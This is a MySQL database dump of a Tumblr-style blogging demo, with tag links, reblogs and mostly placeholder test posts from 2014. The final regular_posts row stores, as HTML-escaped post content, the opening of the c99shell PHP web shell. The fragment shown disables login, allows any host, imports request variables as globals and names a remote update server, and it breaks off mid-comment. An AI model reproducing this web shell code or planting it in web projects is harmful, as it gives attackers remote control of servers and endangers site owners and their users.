INSERT INTO `posts_tags` VALUES (1,1,1,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(2,1,2,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(3,1,3,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(4,2,4,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(5,3,5,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(6,4,6,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(7,5,7,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(8,6,8,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(9,6,9,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(10,7,10,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(11,8,11,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(12,8,12,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(13,9,13,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(14,9,14,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(15,9,15,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(16,10,3,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(17,10,16,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(18,10,14,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(19,10,17,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(20,10,18,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(21,11,6,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(22,12,19,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(23,13,20,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(24,13,21,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(25,14,22,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(26,15,20,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(27,15,23,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(28,16,20,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(29,16,23,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(30,16,24,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(31,17,25,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(32,17,14,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(33,17,16,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(34,18,26,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(35,18,14,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(36,18,16,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(37,19,26,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(38,19,14,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(39,19,16,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(40,20,20,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(41,20,23,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(42,20,24,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(43,21,3,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(44,21,16,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(45,21,14,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(46,21,17,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(47,21,18,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(48,22,13,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(49,22,14,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(50,22,15,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(51,23,27,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(52,23,28,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(53,23,29,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(54,24,30,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(55,24,31,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(56,24,32,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(57,25,29,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(58,25,33,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(59,25,6,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(60,26,13,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(61,26,14,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(62,26,15,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(63,27,8,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(64,27,9,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(65,27,6,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(66,28,9,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(67,28,8,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(68,28,6,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(69,29,34,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(70,29,35,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(71,29,6,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(72,30,36,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(73,30,36,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(74,31,37,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(75,31,7,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(76,31,17,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(77,32,26,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(78,32,14,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(79,32,16,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(80,33,31,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(81,33,16,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(82,33,38,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(83,34,37,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(84,34,17,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(85,34,39,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(86,35,17,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(87,36,40,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(88,37,6,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(89,38,14,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(90,38,16,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(91,38,41,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(92,39,20,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(93,39,42,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(94,39,14,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(95,39,26,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(96,39,16,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(97,40,43,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(98,40,25,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(99,41,44,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(100,42,26,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(101,42,14,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(102,42,16,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(103,43,31,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(104,43,16,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(105,43,38,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(106,44,45,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(107,45,46,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(108,48,47,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(109,48,48,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(110,49,47,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(111,49,48,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(112,51,47,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(113,51,48,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(114,52,14,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(115,53,49,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(116,54,50,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(117,55,51,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(118,56,14,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(119,57,50,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(120,61,6,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(121,62,52,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(122,66,53,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(123,68,54,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(124,69,55,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(125,70,56,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(126,71,56,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(127,72,57,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(129,76,6,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(130,77,6,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(131,78,6,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(132,79,55,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(133,80,58,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(134,80,59,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(135,81,58,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(136,81,59,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(137,82,60,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(138,83,60,'0000-00-00 00:00:00','0000-00-00 00:00:00');
/*!40000 ALTER TABLE `posts_tags` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `reblogged_posts`
--

DROP TABLE IF EXISTS `reblogged_posts`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `reblogged_posts` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `post_id` int(10) unsigned NOT NULL,
  `original_post_id` int(10) unsigned NOT NULL,
  `type` enum('text','image','quote','link') COLLATE utf8_unicode_ci NOT NULL,
  `content` text COLLATE utf8_unicode_ci NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `deleted_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `reblogged_posts_post_id_foreign` (`post_id`),
  KEY `reblogged_posts_original_post_id_foreign` (`original_post_id`),
  CONSTRAINT `reblogged_posts_original_post_id_foreign` FOREIGN KEY (`original_post_id`) REFERENCES `posts` (`id`),
  CONSTRAINT `reblogged_posts_post_id_foreign` FOREIGN KEY (`post_id`) REFERENCES `posts` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=20 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `reblogged_posts`
--

LOCK TABLES `reblogged_posts` WRITE;
/*!40000 ALTER TABLE `reblogged_posts` DISABLE KEYS */;
INSERT INTO `reblogged_posts` VALUES (1,19,18,'image','{\"comment\":\" Love. \"}','2014-05-15 04:53:55','2014-05-15 04:53:55',NULL),(2,20,16,'image','{\"comment\":\" \"}','2014-05-15 04:54:05','2014-05-15 04:54:05',NULL),(3,21,10,'quote','{\"comment\":\" \"}','2014-05-15 04:54:19','2014-05-15 04:54:19',NULL),(4,22,9,'image','{\"comment\":\" \"}','2014-05-15 04:54:25','2014-05-15 04:54:25',NULL),(5,26,9,'image','{\"comment\":\" \"}','2014-05-15 05:04:09','2014-05-15 05:04:09',NULL),(6,42,32,'image','{\"comment\":\" \"}','2014-05-15 06:19:13','2014-05-15 06:19:13',NULL),(7,43,33,'image','{\"comment\":\" \"}','2014-05-15 06:19:26','2014-05-15 06:19:26',NULL),(8,49,48,'','{\"comment\":\" \"}','2014-05-15 07:44:48','2014-05-15 07:44:48',NULL),(9,51,48,'','{\"comment\":\" \"}','2014-05-15 08:08:01','2014-05-15 08:08:01',NULL),(10,56,52,'text','{\"comment\":\" \"}','2014-05-16 03:38:46','2014-05-16 03:38:46',NULL),(11,57,54,'quote','{\"comment\":\" \"}','2014-05-16 03:38:52','2014-05-16 03:38:52',NULL),(12,58,46,'','{\"comment\":\" cool\"}','2014-05-17 23:58:08','2014-05-17 23:58:08',NULL),(13,64,63,'text','{\"comment\":\" \"}','2014-05-18 01:53:45','2014-05-18 01:53:45',NULL),(14,67,65,'image','{\"comment\":\" \"}','2014-05-18 02:08:39','2014-05-18 02:08:39',NULL),(15,71,70,'link','{\"comment\":\" \"}','2014-05-18 02:57:08','2014-05-18 02:57:08',NULL),(16,77,76,'','{\"comment\":\" jchs\"}','2014-05-18 05:57:25','2014-05-18 05:57:25',NULL),(17,78,76,'','{\"comment\":\" jhb\"}','2014-05-18 05:57:32','2014-05-18 05:57:32',NULL),(18,79,69,'image','{\"comment\":\" \"}','2014-05-18 06:02:10','2014-05-18 06:02:10',NULL),(19,81,80,'','{\"comment\":\" \"}','2014-05-18 06:42:24','2014-05-18 06:42:24',NULL);
/*!40000 ALTER TABLE `reblogged_posts` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `regular_posts`
--

DROP TABLE IF EXISTS `regular_posts`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `regular_posts` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `post_id` int(10) unsigned NOT NULL,
  `type` enum('text','video','audio','image','quote','chat','link') COLLATE utf8_unicode_ci NOT NULL,
  `content` text COLLATE utf8_unicode_ci NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `deleted_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `regular_posts_post_id_foreign` (`post_id`),
  CONSTRAINT `regular_posts_post_id_foreign` FOREIGN KEY (`post_id`) REFERENCES `posts` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=65 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `regular_posts`
--

LOCK TABLES `regular_posts` WRITE;
/*!40000 ALTER TABLE `regular_posts` DISABLE KEYS */;
INSERT INTO `regular_posts` VALUES (1,1,'text','{\"title\":\"Poem\",\"content\":\"she&rsquo;s beauty and she&rsquo;s grace, she dropped her phone on her face\"}','2014-05-15 04:39:53','2014-05-15 04:39:53',NULL),(2,2,'chat','{\"title\":\"dfsdf\",\"content\":\"sdfsf\"}','2014-05-15 04:39:56','2014-05-15 04:39:56',NULL),(3,3,'image','{\"files\":[\"uploads\\/pictures\\/tumblr_muyygg6jNT1rlba0uo1_250.png\"]}','2014-05-15 04:40:21','2014-05-15 04:40:21',NULL),(4,4,'link','{\"url\":\"https:\\/\\/www.youtube.com\\/watch?v=DMbG5hSbtWw\",\"title\":\"dddd\",\"caption\":\"\"}','2014-05-15 04:40:25','2014-05-15 04:40:25',NULL),(5,5,'text','{\"title\":\"ada\",\"content\":\"asa\"}','2014-05-15 04:41:01','2014-05-15 04:41:01',NULL),(6,6,'text','{\"title\":\"edgdsgb\",\"content\":\"dgdg\"}','2014-05-15 04:42:11','2014-05-15 04:42:11',NULL),(7,7,'text','{\"title\":\"asdas\",\"content\":\"sasa\"}','2014-05-15 04:42:18','2014-05-15 04:42:18',NULL),(8,8,'text','{\"title\":\"awsda\",\"content\":\"asdfa\"}','2014-05-15 04:42:43','2014-05-15 04:42:43',NULL),(9,9,'image','{\"files\":[\"uploads\\/pictures\\/tumblr_muyygg6jNT1rlba0uo1_250.png\"]}','2014-05-15 04:43:14','2014-05-15 04:43:14',NULL),(10,10,'quote','{\"content\":\"I welcome questions, I hate assumptions\",\"source\":\"www.google.com\"}','2014-05-15 04:44:32','2014-05-15 04:44:32',NULL),(11,11,'link','{\"url\":\"htt\",\"title\":\"\",\"caption\":\"\"}','2014-05-15 04:44:41','2014-05-15 04:44:41',NULL),(12,12,'link','{\"url\":\"http:\\/\\/www.nytimes.com\\/2014\\/05\\/15\\/world\\/africa\\/tales-of-escapees-in-nigeria-add-to-worries-about-other-kidnapped-girls.html?hp\",\"title\":\"Tales of Escapees Add to Worries About Nigerian Girls\",\"caption\":\"Some of the 53 schoolgirls who escaped Boko Haram kidnappers told of their terror as President Goodluck Jonathan rejected the militant group&rsquo;s demand for a prisoner exchange.\"}','2014-05-15 04:45:44','2014-05-15 04:45:44',NULL),(13,13,'link','{\"url\":\"http:\\/\\/www.nytimes.com\\/2014\\/05\\/15\\/world\\/africa\\/tales-of-escapees-in-nigeria-add-to-worries-about-other-kidnapped-girls.html?hp\",\"title\":\"Tales of Escapees Add to Worries About Nigerian Girls\",\"caption\":\"Nigerian Girls\"}','2014-05-15 04:46:26','2014-05-15 04:46:26',NULL),(14,14,'image','{\"files\":[\"uploads\\/pictures\\/original (9).jpg\"]}','2014-05-15 04:50:32','2014-05-15 04:50:32',NULL),(15,15,'image','{\"files\":[\"uploads\\/pictures\\/original (9).jpg\"]}','2014-05-15 04:51:09','2014-05-15 04:51:09',NULL),(16,16,'image','{\"files\":[\"uploads\\/pictures\\/original (8).jpg\"]}','2014-05-15 04:51:26','2014-05-15 04:51:26',NULL),(17,17,'image','{\"files\":[\"uploads\\/pictures\\/original (7).jpg\"]}','2014-05-15 04:51:45','2014-05-15 04:51:45',NULL),(18,18,'image','{\"files\":[\"uploads\\/pictures\\/tumblr_muxjjs9fmW1rlba0uo1_250.gif\"]}','2014-05-15 04:52:08','2014-05-15 04:52:08',NULL),(19,23,'image','{\"files\":[\"uploads\\/pictures\\/original (13).jpg\"]}','2014-05-15 04:58:01','2014-05-15 04:58:01',NULL),(20,24,'image','{\"files\":[\"uploads\\/pictures\\/original (12).jpg\"]}','2014-05-15 04:58:47','2014-05-15 04:58:47',NULL),(21,25,'image','{\"files\":[\"uploads\\/pictures\\/original (10).jpg\"]}','2014-05-15 04:58:59','2014-05-15 04:58:59',NULL),(22,27,'text','{\"title\":\"dgdsg\",\"content\":\"dgdg\"}','2014-05-15 05:05:08','2014-05-15 05:05:08',NULL),(23,28,'text','{\"title\":\"dsfsdg\",\"content\":\"dfdg\"}','2014-05-15 05:06:46','2014-05-15 05:06:46',NULL),(24,29,'text','{\"title\":\"dgrhdtjgj\",\"content\":\"sfdsg\"}','2014-05-15 05:10:29','2014-05-15 05:10:29',NULL),(25,30,'text','{\"title\":\"aaaaa\",\"content\":\"sgdfhfdhj\"}','2014-05-15 05:11:06','2014-05-15 05:11:06',NULL),(26,31,'chat','{\"title\":\"Funny text\",\"content\":\"User 1: Hello\\r\\nUser 2: How are you\"}','2014-05-15 05:14:22','2014-05-15 05:14:22',NULL),(27,32,'image','{\"files\":[\"uploads\\/pictures\\/tumblr_n371rkrOVS1rlba0uo1_250.gif\"]}','2014-05-15 05:14:39','2014-05-15 05:14:39',NULL),(28,33,'image','{\"files\":[\"uploads\\/pictures\\/original (11).jpg\"]}','2014-05-15 05:15:06','2014-05-15 05:15:06',NULL),(29,34,'image','{\"files\":[\"uploads\\/pictures\\/tumblr_mzdb6q8uoe1snkwx1o1_500.jpg\"]}','2014-05-15 05:15:29','2014-05-15 05:15:29',NULL),(30,35,'quote','{\"content\":\"Evil world. \",\"source\":\"www.google.com\"}','2014-05-15 05:15:46','2014-05-15 05:15:46',NULL),(31,36,'video','{\"url\":\"uploads\\/videos\\/1 Second Video.mp4\",\"filename\":\"1 Second Video.mp4\"}','2014-05-15 05:34:13','2014-05-15 05:34:13',NULL),(32,37,'chat','{\"title\":\"dfsdfsdf\",\"content\":\"sdfsf\"}','2014-05-15 05:58:29','2014-05-15 05:58:29',NULL),(33,38,'image','{\"files\":[\"uploads\\/pictures\\/original (1).jpg\"]}','2014-05-15 06:09:19','2014-05-15 06:09:19',NULL),(34,39,'image','{\"files\":[\"uploads\\/pictures\\/original (2).jpg\"]}','2014-05-15 06:09:43','2014-05-15 06:09:43',NULL),(35,40,'image','{\"files\":[\"uploads\\/pictures\\/original (6).jpg\"]}','2014-05-15 06:10:39','2014-05-15 06:10:39',NULL),(36,41,'image','{\"files\":[\"uploads\\/pictures\\/tumblr_mo4jegpeVK1rlba0uo1_250.jpg\"]}','2014-05-15 06:11:27','2014-05-15 06:11:27',NULL),(37,44,'video','{\"url\":\"uploads\\/videos\\/Message from President Obama- Happy National Small Business Week.mp4\",\"filename\":\"Message from President Obama- Happy National Small Business Week.mp4\"}','2014-05-15 06:42:57','2014-05-15 06:42:57',NULL),(38,45,'video','{\"url\":\"uploads\\/videos\\/Nagada Sang Dhol Song - Goliyon Ki Raasleela Ram-leela ft. Deepika Padukone, Ranveer Singh.mp4\",\"filename\":\"Nagada Sang Dhol Song - Goliyon Ki Raasleela Ram-leela ft. Deepika Padukone, Ranveer Singh.mp4\"}','2014-05-15 06:50:59','2014-05-15 06:50:59',NULL),(39,46,'video','{\"url\":\"uploads\\/videos\\/Double the Fun DCT Short Film.mp4\",\"filename\":\"Double the Fun DCT Short Film.mp4\"}','2014-05-15 07:10:49','2014-05-15 07:10:49',NULL),(40,47,'video','{\"url\":\"uploads\\/videos\\/NBC News Anchor Fired In Less Than A Minute.mp4\",\"filename\":\"NBC News Anchor Fired In Less Than A Minute.mp4\"}','2014-05-15 07:11:57','2014-05-15 07:11:57',NULL),(41,48,'video','{\"url\":\"uploads\\/videos\\/Elle se balade cul nu dans la rue.mp4\",\"filename\":\"Elle se balade cul nu dans la rue.mp4\"}','2014-05-15 07:28:18','2014-05-15 07:28:18',NULL),(42,50,'audio','{\"url\":\"uploads\\/audios\\/01. Newly Married.mp3\",\"filename\":\"01. Newly Married.mp3\"}','2014-05-15 07:59:18','2014-05-15 07:59:18',NULL),(43,52,'text','{\"title\":\"Testing\",\"content\":\"Love this script\"}','2014-05-16 03:23:28','2014-05-16 03:23:28',NULL),(44,53,'image','{\"files\":[\"uploads\\/pictures\\/208ba73285f964de44729c70338685b2.jpeg\"]}','2014-05-16 03:24:45','2014-05-16 03:24:45',NULL),(45,54,'quote','{\"content\":\"Good Script\",\"source\":\"- jose\"}','2014-05-16 03:25:17','2014-05-16 03:25:17',NULL),(46,55,'chat','{\"title\":\"Arts &amp; Entertainment News\",\"content\":\"what can you say about this subject?\"}','2014-05-16 03:31:02','2014-05-16 03:31:02',NULL),(47,59,'image','{\"files\":[\"uploads\\/pictures\\/tumblr_mydv9gLUAu1qd9ql4o1_500.jpg\"]}','2014-05-17 23:59:22','2014-05-17 23:59:22',NULL),(48,60,'audio','{\"url\":\"uploads\\/audios\\/Zembele_____.mp3\",\"filename\":\"Zembele_____.mp3\"}','2014-05-18 00:01:25','2014-05-18 00:01:25',NULL),(49,61,'chat','{\"title\":\"not bad\",\"content\":\"looking forward to ajax upoad\"}','2014-05-18 00:02:40','2014-05-18 00:02:40',NULL),(50,62,'text','{\"title\":\"Yellow Pages | Business Directory | Local Business\",\"content\":\"Please check the Demo http:\\/\\/www.yellowpagesphpscript.com.\\r\\n\"}','2014-05-18 00:22:05','2014-05-18 00:22:05',NULL),(51,63,'text','{\"title\":\"NICE\",\"content\":\"NICE - from denmark\"}','2014-05-18 01:53:34','2014-05-18 01:53:34',NULL),(52,65,'image','{\"files\":[\"uploads\\/pictures\\/fff.jpg\"]}','2014-05-18 01:54:47','2014-05-18 01:54:47',NULL),(53,66,'chat','{\"title\":\"dssdSD\",\"content\":\"QSDSDQSD\"}','2014-05-18 02:07:31','2014-05-18 02:07:31',NULL),(54,68,'text','{\"title\":\"defqSDFQD\",\"content\":\"FQDSFQDf\"}','2014-05-18 02:09:28','2014-05-18 02:09:28',NULL),(55,69,'image','{\"files\":[\"uploads\\/pictures\\/banner2-htmlcss.png\"]}','2014-05-18 02:09:45','2014-05-18 02:09:45',NULL),(56,70,'link','{\"url\":\"http:\\/\\/www.youtube.com\\/watch?v=KjHXfQUB2qA\",\"title\":\"SD&lt;FSDF\",\"caption\":\"QDFDSFSDGF\"}','2014-05-18 02:10:06','2014-05-18 02:10:06',NULL),(57,72,'text','{\"title\":\"\",\"content\":\"I am happy\"}','2014-05-18 04:19:08','2014-05-18 04:19:08',NULL),(58,73,'audio','{\"url\":\"uploads\\/audios\\/090414DULUXPaintSingItBBRDUBR001030.mp3\",\"filename\":\"090414DULUXPaintSingItBBRDUBR001030.mp3\"}','2014-05-18 04:54:40','2014-05-18 04:54:40',NULL),(59,74,'quote','{\"content\":\"Just testing\",\"source\":\"The Daily Mail\"}','2014-05-18 04:56:33','2014-05-18 04:56:33',NULL),(60,75,'text','{\"title\":\"News Story\",\"content\":\"The is a test of the script\"}','2014-05-18 05:27:32','2014-05-18 05:27:32',NULL),(61,76,'chat','{\"title\":\"yo\",\"content\":\"yo\"}','2014-05-18 05:57:15','2014-05-18 05:57:15',NULL),(62,80,'chat','{\"title\":\"Chat for gay guys\",\"content\":\"Chat for gay guys. Only Gays sister and brother. \"}','2014-05-18 06:37:33','2014-05-18 06:37:33',NULL),(63,82,'text','{\"title\":\"dasdasd\",\"content\":\"asdas\"}','2014-05-18 07:13:52','2014-05-18 07:13:52',NULL),(64,83,'text','{\"title\":\"123\",\"content\":\"\\r\\n&lt;?php\\r\\n\\r\\n\\/\\/Starting calls\\r\\nif (!function_exists(&quot;getmicrotime&quot;)) {function getmicrotime() {list($usec, $sec) = explode(&quot; &quot;, microtime()); return ((float)$usec + (float)$sec);}}\\r\\nerror_reporting(5);\\r\\n@ignore_user_abort(true);\\r\\n@set_magic_quotes_runtime(0);\\r\\n@set_time_limit(0);\\r\\n$win = strtolower(substr(PHP_OS, 0, 3)) == &quot;win&quot;;\\r\\nif (!@ob_get_contents()) {@ob_start(); @ob_implicit_flush(0);}\\r\\ndefine(&quot;starttime&quot;,getmicrotime());\\r\\nif (get_magic_quotes_gpc()) {if (!function_exists(&quot;strips&quot;)) {function strips(&amp;$arr,$k=&quot;&quot;) {if (is_array($arr)) {foreach($arr as $k=&gt;$v) {if (strtoupper($k) != &quot;GLOBALS&quot;) {strips($arr[&quot;$k&quot;]);}}} else {$arr = stripslashes($arr);}}} strips($GLOBALS);}\\r\\n$_REQUEST = array_merge($_COOKIE,$_GET,$_POST);\\r\\nforeach($_REQUEST as $k=&gt;$v) {if (!isset($$k)) {$$k = $v;}}\\r\\n\\r\\n$shver = &quot;1.0 beta (21.05.2005)&quot;; \\/\\/Current version\\r\\n\\/\\/CONFIGURATION AND SETTINGS\\r\\nif (!empty($unset_surl)) {setcookie(&quot;c99sh_surl&quot;); $surl = &quot;&quot;;}\\r\\nelseif (!empty($set_surl)) {$surl = $set_surl; setcookie(&quot;c99sh_surl&quot;,$surl);}\\r\\nelse {$surl = $_REQUEST[&quot;c99sh_surl&quot;]; \\/\\/Set this cookie for manual SURL\\r\\n}\\r\\n\\r\\n$surl_autofill_include = true; \\/\\/If true then search variables with descriptors (URLs) and save it in SURL.\\r\\n\\r\\nif ($surl_autofill_include and !$_REQUEST[&quot;c99sh_surl&quot;]) {$include = &quot;&amp;&quot;; foreach (explode(&quot;&amp;&quot;,getenv(&quot;QUERY_STRING&quot;)) as $v) {$v = explode(&quot;=&quot;,$v); $name = urldecode($v[0]); $value = urldecode($v[1]); foreach (array(&quot;http:\\/\\/&quot;,&quot;https:\\/\\/&quot;,&quot;ssl:\\/\\/&quot;,&quot;ftp:\\/\\/&quot;,&quot;\\\\\\\\\\\\\\\\&quot;) as $needle) {if (strpos($value,$needle) === 0) {$includestr .= urlencode($name).&quot;=&quot;.urlencode($value).&quot;&amp;&quot;;}}} if ($_REQUEST[&quot;surl_autofill_include&quot;]) {$includestr .= &quot;surl_autofill_include=1&amp;&quot;;}}\\r\\nif (empty($surl))\\r\\n{\\r\\n $surl = &quot;?&quot;.$includestr; \\/\\/Self url\\r\\n}\\r\\n$surl = htmlspecialchars($surl);\\r\\n\\r\\n$timelimit = 60; \\/\\/limit of execution this script (seconds), 0 = unlimited.\\r\\n\\r\\n\\/\\/Authentication\\r\\n\\r\\n$login = &quot;c99&quot;; \\/\\/login\\r\\n\\/\\/DON\'T FORGOT ABOUT CHANGE PASSWORD!!!\\r\\n$pass = &quot;c99&quot;; \\/\\/password\\r\\n$md5_pass = &quot;&quot;; \\/\\/md5-cryped pass. if null, md5($pass)\\r\\n\\r\\n\\t\\/*COMMENT IT FOR TURN ON AUTHENTIFICATION &gt;&gt;&gt;*\\/\\t$login = false; \\/\\/turn off authentification\\r\\n\\r\\n$host_allow = array(&quot;*&quot;); \\/\\/array (&quot;{mask}1&quot;,&quot;{mask}2&quot;,...), {mask} = IP or HOST e.g. array(&quot;192.168.0.*&quot;,&quot;127.0.0.1&quot;)\\r\\n$login_txt = &quot;Restricted area&quot;; \\/\\/http-auth message.\\r\\n$accessdeniedmess = &quot;&lt;a href=\\\\&quot;http:\\/\\/ccteam.ru\\/releases\\/c99shell\\\\&quot;&gt;c99shell v.&quot;.$shver.&quot;&lt;\\/a&gt;: access denied&quot;;\\r\\n\\r\\n$autoupdate = false; \\/\\/Automatic updating?\\r\\n$updatenow = false; \\/\\/If true, update now\\r\\n$c99sh_updatefurl = &quot;http:\\/\\/ccteam.ru\\/releases\\/update\\/c99shell\\/&quot;; \\/\\/Update server\\r\\n\\r\\n$filestealth = false; \\/\\/if true, don\'t change modify&amp;access-time\\r\\n\\r\\n$donated_html = &quot;&lt;center&gt;&lt;b&gt;GaRDeNFoX&lt;\\/b&gt;&lt;\\/center&gt;&quot;;\\r\\n\\t\\t\\/* If you publish free shell and you wish\\r\\n\\t\\tadd link to your site or any other information,\\r\\n\\t\\tput here your html. 